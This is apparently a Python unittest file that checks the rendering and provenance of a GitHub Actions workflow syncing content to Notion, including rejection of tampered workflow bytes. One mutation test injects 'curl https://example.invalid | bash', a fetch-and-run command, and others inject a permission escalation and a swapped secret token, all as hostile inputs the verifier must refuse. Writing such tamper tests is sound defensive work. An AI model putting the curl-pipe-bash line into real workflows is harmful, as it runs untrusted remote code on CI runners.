"""Two-commit controller binding, with no external reads or publication."""
import base64
from copy import deepcopy
import json
import os
from pathlib import Path
import sys
import tempfile
import unittest
from unittest.mock import patch
sys.path.insert(0, str(Path(__file__).resolve().parents[1] / 'scripts'))
import get_recurring_controller as c
import get_publication_provenance as p
import get_recurring_runtime as rt
from get_recurring_entry import a, r
import test_publication_provenance as fixture


class ControllerTests(unittest.TestCase):
    def setUp(self):
        self.policy = fixture.policy()
        self.digest = a.sha(a.encoded(self.policy))
        self.scope = c.scope_for(self.policy, self.digest)
        self.scope_sha = a.sha(a.encoded(self.scope))

    def response(self, raw):
        return {'type': 'file', 'path': self.policy['workflow_path'], 'encoding': 'base64',
                'size': len(raw), 'sha': r.oid(raw), 'content': base64.b64encode(raw).decode()}

    def test_deterministic_render_has_A_but_never_requires_C(self):
        first = c.render(self.policy, self.digest, self.scope_sha)
        self.assertEqual(first, c.render(deepcopy(self.policy), self.digest, self.scope_sha))
        self.assertIn(("ref: '" + self.policy['code_sha'] + "'").encode(), first)
        self.assertNotIn(b'@@', first)
        self.assertIn(b"cron: '17 * * * *'", first)
        self.assertIn(b'contents: read', first); self.assertNotIn(b'actions: write', first)
        self.assertNotIn(b'actions: read', first); self.assertIn(b'NOTION_API_KEY: ${{ secrets.NOTION_API_KEY }}', first)
        self.assertIn(self.digest.encode(), first); self.assertIn(self.scope_sha.encode(), first)
        self.assertIn(b'persist-credentials: false', first)
        self.assertEqual(first.count(b'      - name: Emit verified canonical publication anchor'), 1)

    def test_notion_step_uses_confirmed_current_file_and_same_approved_policy(self):
        raw = c.render(self.policy, self.digest, self.scope_sha)
        start = raw.index(b'      - name: Sync confirmed Get content to Notion')
        step = raw[start:]
        self.assertEqual(raw.count(b'        id: notion_sync'), 1)
        self.assertIn(b"if: ${{ steps.get_sync.outcome == 'success' && (github.event_name == 'schedule' || inputs.apply) }}", step)
        self.assertIn(b'        continue-on-error: true', step)
        self.assertIn(b'GITHUB_TOKEN: ${{ github.token }}', step)
        self.assertIn(b'PRIVATE_VAULT_TOKEN: ${{ secrets.PRIVATE_VAULT_TOKEN }}', step)
        self.assertIn(b'python scripts/get_notion_runtime.py', step)
        self.assertIn(b'--publication-file "$RUNNER_TEMP/get-canonical-publication.txt"', step)
        self.assertIn(b'--apply --scope-from-policy', step)
        self.assertIn(self.digest.encode(), step)
        self.assertNotIn(b'changed_content', step)
        self.assertLess(raw.index(b'        id: get_sync'), start)

    def test_get_only_scope_cannot_activate_same_controller_notion(self):
        scope = c.scope_for(self.policy, self.digest)
        self.assertEqual(scope['sink'], 'same-controller-confirmed-content-only')
        self.assertEqual(scope['notion_scope_contract'], 'get-notion-standing-runtime-1')
        self.assertEqual(scope['notion_batch_max'], 50)
        self.assertEqual(scope['notion_journal_path'], '.sync/get-notion/state.json')
        self.assertEqual(scope['notion_initial_proof_sha256'], 'f3b616ec734324e785f4258482fb961ee937161316375ad8b28ea29c7d60f11e')
        old = {k: v for k, v in scope.items() if not k.startswith('notion_')}
        old['sink'] = 'separate-confirmed-content-only'
        with self.assertRaises(p.ProvenanceFailure):
            c.render(self.policy, self.digest, a.sha(a.encoded(old)))
        with patch.object(rt, 'PRODUCTION_ACTIVATED', True):
            rt.validate_scope(scope, a.sha(a.encoded(scope)), self.policy, self.digest)
            for key, value in [('sink', old['sink']), ('notion_batch_max', 51),
                               ('notion_scope_contract', 'foreign'), ('notion_journal_path', 'Raw/03 Get/state.json'),
                               ('notion_initial_proof_sha256', 'f' * 64)]:
                bad = {**scope, key: value}
                with self.assertRaisesRegex(a.ParityFailure, 'runtime_scope'):
                    rt.validate_scope(bad, a.sha(a.encoded(bad)), self.policy, self.digest)
            with self.assertRaisesRegex(a.ParityFailure, 'runtime_scope'):
                rt.validate_scope(old, a.sha(a.encoded(old)), self.policy, self.digest)

    def test_get_anchor_survives_later_continued_notion_failure(self):
        api = fixture.FakeAPI()
        path = '/actions/runs/1001/attempts/1/jobs?per_page=100&page=1'
        value = api.json(path)
        value['jobs'][0]['steps'].append({'name': 'Sync confirmed Get content to Notion',
            'status': 'completed', 'conclusion': 'failure', 'number': 6})
        api.overrides[path] = value
        verified = p.discover(api, self.policy)
        self.assertEqual(verified['anchor']['commit'], 'd' * 40)
        # A failed Get emission or failed overall job is still not a Get anchor.
        value['jobs'][0]['steps'][0]['conclusion'] = 'failure'
        api.overrides[path] = value
        with self.assertRaises(p.ProvenanceFailure): p.discover(api, self.policy)

    def test_notion_gate_command_and_permission_mutations_fail_exact_render(self):
        raw = c.expected_bytes(self.policy)
        for old, new in [(b'continue-on-error: true', b'continue-on-error: false'),
                         (b"steps.get_sync.outcome == 'success'", b'always()'),
                         (b'python scripts/get_notion_runtime.py', b'python arbitrary.py'),
                         (b'GITHUB_TOKEN: ${{ github.token }}', b'GITHUB_TOKEN: ${{ secrets.NEW_TOKEN }}')]:
            api = fixture.FakeAPI()
            api.overrides['/contents/' + self.policy['workflow_path'] + '?ref=' + 'c' * 40] = self.response(raw.replace(old, new))
            with self.assertRaises(p.ProvenanceFailure): c.verify_remote(api, 'c' * 40, self.policy)

    def test_nonapproved_policy_scope_or_template_digest_rejected(self):
        with self.assertRaises(a.ParityFailure): c.render(self.policy, 'f' * 64, self.scope_sha)
        with self.assertRaises(a.ParityFailure): c.render(self.policy, self.digest, 'f' * 64)
        for key, value in [('controller_template_sha256', 'f' * 64), ('job_name', 'foreign'),
                           ('publication_step_name', 'foreign'), ('code_sha', '${{ secrets.KEY }}')]:
            bad = {**self.policy, key: value}; digest = a.sha(a.encoded(bad))
            with self.assertRaises(a.ParityFailure): c.render(bad, digest, a.sha(a.encoded(c.scope_for(bad, digest))))

    def test_exact_remote_bytes_checked_at_C_and_unknown_hash_not_a_trust_root(self):
        api = fixture.FakeAPI(); controller = 'c' * 40
        self.assertEqual(c.verify_remote(api, controller, self.policy), controller)
        self.assertEqual(api.called, ['/contents/' + self.policy['workflow_path'] + '?ref=' + controller])
        path = api.called[0]
        # The response advertises a perfectly consistent hash for malicious
        # bytes; it still fails the independently reviewed template comparison.
        api.overrides[path] = self.response(c.expected_bytes(self.policy) + b'\n# Foreign appended script\n')
        with self.assertRaisesRegex(p.ProvenanceFailure, 'provenance_controller'):
            c.verify_remote(api, controller, self.policy)

    def test_arbitrary_checkout_script_permission_and_expression_mutations_fail(self):
        raw = c.expected_bytes(self.policy); controller = 'c' * 40
        for old, new in [(b"ref: '" + b'a' * 40, b"ref: '" + b'f' * 40),
                         (b'contents: read', b'contents: write'),
                         (b'python scripts/get_recurring_runtime.py', b'curl https://example.invalid | bash #'),
                         (b'inputs.apply', b'inputs.arbitrary_command')]:
            api = fixture.FakeAPI()
            api.overrides['/contents/' + self.policy['workflow_path'] + '?ref=' + controller] = self.response(raw.replace(old, new))
            with self.assertRaises(p.ProvenanceFailure): c.verify_remote(api, controller, self.policy)

    def test_publication_allows_C_distinct_from_A_only_with_exact_controller(self):
        run = fixture.run(head_sha='c' * 40); record = fixture.record(run)
        api = fixture.FakeAPI([run], {run['id']: record})
        verified = p.discover(api, self.policy)
        self.assertEqual(verified['anchor']['commit'], record['receipt_commit'])
        self.assertEqual(record['code_sha'], 'a' * 40); self.assertEqual(record['controller_sha'], 'c' * 40)
        self.assertIn('/contents/' + self.policy['workflow_path'] + '?ref=' + 'c' * 40, api.called)

    def test_historical_other_controller_is_skipped_not_blessed(self):
        rows = [fixture.run(1002, head_sha='c' * 40, minute=8), fixture.run(1001, head_sha='d' * 40)]
        api = fixture.FakeAPI(rows, {row['id']: fixture.record(row) for row in rows})
        api.overrides['/contents/' + self.policy['workflow_path'] + '?ref=' + 'd' * 40] = self.response(b'Old manual workflow, not this controller')
        verified = p.discover(api, self.policy)
        self.assertEqual(verified['run_id'], 1002)
        self.assertNotIn('logs:1501', api.called)
        self.assertIn('logs:1502', api.called)

    def test_mismatched_log_controller_commit_is_rejected(self):
        run = fixture.run(head_sha='c' * 40)
        api = fixture.FakeAPI([run], {run['id']: fixture.record(run, controller_sha='d' * 40)})
        with self.assertRaisesRegex(p.ProvenanceFailure, 'provenance_record'): p.discover(api, self.policy)

    def test_wrong_job_checkout_claim_does_not_override_run_controller(self):
        row = fixture.run(head_sha='c' * 40); api = fixture.FakeAPI([row], {row['id']: fixture.record(row)})
        path = '/actions/runs/1001/attempts/1/jobs?per_page=100&page=1'; value = api.json(path)
        value['jobs'][0]['head_sha'] = self.policy['code_sha']; api.overrides[path] = value
        with self.assertRaisesRegex(p.ProvenanceFailure, 'provenance_job'): p.discover(api, self.policy)

    def test_current_execution_checks_exact_attempt_and_controller_before_private_io(self):
        execution = {'run_id': 1002, 'run_attempt': 2, 'code_sha': 'a' * 40, 'controller_sha': 'c' * 40}
        path = '/actions/runs/1002/attempts/2'; api = fixture.FakeAPI()
        row = fixture.run(1002, attempt=2, head_sha='c' * 40, event='workflow_dispatch', status='in_progress', conclusion=None)
        api.overrides[path] = row
        p.verify_execution(api, self.policy, execution, 'manual')
        self.assertEqual(api.called[0], path)
        for key, value in [('head_sha', 'f' * 40), ('run_attempt', 1), ('workflow_id', 22), ('event', 'pull_request'), ('status', 'completed')]:
            api.overrides[path] = {**row, key: value}
            with self.assertRaises(p.ProvenanceFailure): p.verify_execution(api, self.policy, execution, 'manual')
        with self.assertRaises(p.ProvenanceFailure): p.verify_execution(api, self.policy, {**execution, 'code_sha': 'f' * 40}, 'manual')

    def test_cli_uses_actual_git_HEAD_A_and_GITHUB_SHA_C(self):
        policy = fixture.policy(rules_sha256=rt.entry.rules_sha256(), get_policy_sha256=rt.entry.policy_sha256(rt.entry.rules_sha256(), rt.entry.BOOTSTRAP))
        digest = a.sha(a.encoded(policy)); scope_sha = a.sha(a.encoded(c.scope_for(policy, digest)))
        env = {'GITHUB_REPOSITORY': p.REPOSITORY, 'GITHUB_WORKFLOW_REF': p.REPOSITORY + '/' + policy['workflow_path'] + '@refs/heads/main',
               'GITHUB_REF': 'refs/heads/main', 'GITHUB_EVENT_NAME': 'workflow_dispatch', 'GITHUB_RUN_ID': '1002',
               'GITHUB_RUN_ATTEMPT': '1', 'GITHUB_SHA': 'c' * 40, 'PRIVATE_VAULT_TOKEN': 'existing', 'GITHUB_TOKEN': 'existing-public'}
        import sync_getnote_to_raw as sync
        with tempfile.TemporaryDirectory() as folder:
            path = Path(folder) / 'policy'; path.write_bytes(a.encoded(policy))
            with patch.object(rt, 'PRODUCTION_ACTIVATED', True), patch.object(rt, 'executed_code_sha', return_value='a' * 40), patch.dict(os.environ, env), patch.object(rt.m, 'disabled_writers'), patch.object(sync, 'load_credentials', return_value=('existing', 'client')), patch.object(rt.m.c, 'Source', return_value=object()), patch.object(rt, 'run', return_value={'status': 'recurring_transaction_verified', 'publication_output': 'confirmed'}) as run, patch('builtins.print'):
                result = rt.main(['--policy', str(path), '--approved-policy-sha256', digest, '--apply', '--scope-from-policy', '--approved-scope-sha256', scope_sha, '--checkpoint', str(Path(folder) / 'attempt')])
        self.assertEqual(result, 0)
        self.assertEqual(run.call_args.kwargs['run_context']['code_sha'], 'a' * 40)
        self.assertEqual(run.call_args.kwargs['run_context']['controller_sha'], 'c' * 40)
        self.assertEqual(run.call_args.kwargs['scope'], c.scope_for(policy, digest))

    def test_renderer_cli_creates_only_local_artifact_and_refuses_overwrite(self):
        with tempfile.TemporaryDirectory() as folder:
            path = Path(folder) / 'policy'; path.write_bytes(a.encoded(self.policy)); target = Path(folder) / 'controller.yml.disabled'
            args = ['--policy', str(path), '--approved-policy-sha256', self.digest, '--approved-scope-sha256', self.scope_sha, '--output', str(target)]
            with patch('builtins.print'):
                self.assertEqual(c.main(args), 0); expected = target.read_bytes()
                self.assertEqual(c.main(args), 1)
            self.assertEqual(target.read_bytes(), expected); self.assertEqual(target.stat().st_mode & 0o777, 0o600)

    def test_current_job_file_is_exclusive_and_exact_context_parse_needs_no_completed_run(self):
        row = fixture.run(1002, head_sha='c' * 40)
        record = fixture.record(row); line = p.publication_line(record)
        with tempfile.TemporaryDirectory() as folder:
            path = Path(folder) / 'get-canonical-publication.txt'
            rt.write_publication_file(path, line)
            self.assertEqual(path.stat().st_mode & 0o777, 0o600)
            parsed = p.parse_record(a.bounded_file(path, 8193), self.policy,
                {'id': 1002, 'run_attempt': 1, 'head_sha': 'c' * 40})
            self.assertEqual(parsed, record)
            with self.assertRaises(FileExistsError): rt.write_publication_file(path, line)
            self.assertEqual(path.read_bytes(), (line + '\n').encode())
            for context in ({'id': 1003, 'run_attempt': 1, 'head_sha': 'c' * 40},
                            {'id': 1002, 'run_attempt': 2, 'head_sha': 'c' * 40},
                            {'id': 1002, 'run_attempt': 1, 'head_sha': 'd' * 40}):
                with self.assertRaises(p.ProvenanceFailure): p.parse_record(path.read_bytes(), self.policy, context)

    def test_current_job_file_refuses_symlink_and_private_payload(self):
        line = p.publication_line(fixture.record())
        with tempfile.TemporaryDirectory() as folder:
            target = Path(folder) / 'foreign'; target.write_text('Keep')
            link = Path(folder) / 'link'; link.symlink_to(target)
            with self.assertRaises(a.ParityFailure): rt.write_publication_file(link, line)
            self.assertEqual(target.read_text(), 'Keep')
            with self.assertRaises(a.ParityFailure): rt.write_publication_file(Path(folder) / 'bad', 'Private note text')
            self.assertFalse((Path(folder) / 'bad').exists())

    def test_template_provides_fixed_success_file_to_fixed_notion_command(self):
        raw = c.expected_bytes(self.policy)
        self.assertIn(b'id: get_sync', raw)
        self.assertIn(b'--publication-file "$RUNNER_TEMP/get-canonical-publication.txt"', raw)
        self.assertEqual(raw.count(b'python scripts/get_notion_runtime.py'), 1)

    def test_four_candidates_plus_current_validation_fit_shared_request_budget(self):
        # Per candidate: attempt, workflow bytes, jobs, log redirect+download,
        # rerun recheck = six. Initial current metadata+workflow = two; discovery
        # repo+workflow+three pages = five. 2 + 5 + 4*6 = 31 <= hard 32.
        self.assertEqual(p.MAX_CANDIDATES, 4)
        self.assertLessEqual(2 + 2 + p.MAX_RUN_PAGES + 6 * p.MAX_CANDIDATES, p.MAX_REQUESTS)
        # Existing anonymous old-writer gate makes twelve requests twice.
        self.assertLessEqual(p.MAX_REQUESTS + 24, 60)


if __name__ == '__main__': unittest.main()
